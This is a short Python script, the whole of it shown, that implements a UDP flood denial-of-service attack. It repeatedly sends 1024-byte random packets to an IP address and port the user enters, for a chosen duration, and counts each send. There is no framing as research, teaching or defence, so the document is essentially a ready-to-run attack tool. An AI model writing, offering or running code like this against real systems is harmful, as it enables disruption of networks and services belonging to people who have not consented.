import socket
import random
import time

def udp_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    timeout = time.time() + duration

    sent_packets = 0
    while time.time() < timeout:
        client.sendto(bytes, (target_ip, target_port))
        sent_packets += 1
        print(f"Sent {sent_packets} packets to {target_ip} through port {target_port}")

if __name__ == "__main__":
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    duration = int(input("Enter duration (in seconds): "))
    udp_flood(target_ip, target_port, duration)
